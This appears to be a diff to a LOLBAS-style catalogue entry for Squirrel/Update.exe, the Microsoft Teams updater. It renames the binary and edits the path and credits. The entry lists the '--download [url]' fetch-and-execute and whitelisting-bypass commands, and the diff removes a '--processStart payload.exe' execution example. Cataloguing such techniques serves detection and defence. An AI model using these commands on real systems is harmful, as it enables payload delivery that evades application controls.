@@ -1,10 +1,9 @@
----
-Name: Update.exe
+Name: Squirrel.exe
 Description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
-Author: 'Oddvar Moe'
+Author: 'Reegun J (OCBC Bank) - @reegun21'
 Created: '2019-06-26'
 Commands:
-  - Command: Update.exe --download [url to package]
+  - Command: squirrel.exe --download [url to package]
     Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download and execute binary
     Category: Execute
@@ -12,15 +11,15 @@ Commands:
     MitreID: T1218 
     MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --download [url to package]
+  - Command: squirrel.exe --download [url to package]
     Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/techniques/T1218/
-    OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --download [url to package]
+    OperatingSystem: Windows 10
+  - Command: squirrel.exe --download [url to package]
     Description: The above binary will go to url and look for RELEASES file and download the nuget package.
     Usecase: Download and execute binary
     Category: Download
@@ -28,24 +27,8 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
-    Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
-    Usecase: Application Whitelisting Bypass
-    Category: AWL Bypass
-    Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
-    OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
-    Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
-    Usecase: Execute binary
-    Category: Execute
-    Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
-    OperatingSystem: Windows 7 and up with Microsoft Teams installed
 Full_Path:
-  - Path: '%localappdata%\Microsoft\Teams\update.exe'
+  - Path: '%localappdata%\Microsoft\Teams\current\Squirrel.exe'
 Code_Sample: 
   - Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
 Detection: 
@@ -53,13 +36,10 @@ Detection:
 Resources:
   - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
   - Link: https://twitter.com/reegun21/status/1144182772623269889
-  - Link: https://twitter.com/MrUn1k0d3r/status/1143928885211537408
   - Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
 Acknowledgement:
   - Person: Reegun J (OCBC Bank)
     Handle: '@reegun21'
-  - Person: Mr.Un1k0d3r
-    Handle: '@MrUn1k0d3r'
   - Person: Adam
     Handle: '@Hexacorn'
 ---
